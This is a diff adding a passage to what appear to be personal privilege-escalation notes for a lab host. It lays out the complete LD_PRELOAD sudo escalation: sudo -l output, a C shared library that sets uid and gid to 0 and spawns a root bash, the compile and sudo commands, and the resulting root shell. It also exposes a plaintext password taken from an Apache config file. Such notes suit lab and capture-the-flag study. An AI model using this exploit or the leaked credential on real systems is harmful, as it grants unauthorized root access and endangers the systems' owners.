@@ -104,5 +104,52 @@ Matching Defaults entries for saad on m4lware:
 User saad may run the following commands on m4lware:
     (root) /usr/bin/ping
 
+ /etc/apache2/sites-available/default-ssl.conf:              #        file needs this password: `xxj31ZMTZzkVA'.
+
+
+## env_keep+=LD_PRELOAD Found after sudo -l
+
+saad@m4lware:~$ sudo -l
+Matching Defaults entries for saad on m4lware:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User saad may run the following commands on m4lware:
+    (root) /usr/bin/ping
+
+
+### cat shell.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+void _init() {
+	unsetenv("LD_PRELOAD");
+	setuid(0);
+	setgid(0);
+	system("/bin/bash -p");
+	}
+
+### Download to /tmp on victim PC
+### Compile
+
+saad@m4lware:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+shell.c: In function ‘_init’:
+shell.c:6:2: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+    6 |  setuid(0);
+      |  ^~~~~~
+shell.c:7:2: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
+    7 |  setgid(0);
+      |  ^~~~~~
+### Run
+
+saad@m4lware:/tmp$ sudo LD_PRELOAD=/tmp/shell.so ping
+
+### get root
+root@m4lware:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+root@m4lware:/tmp# 
+
+
 
 <\code>
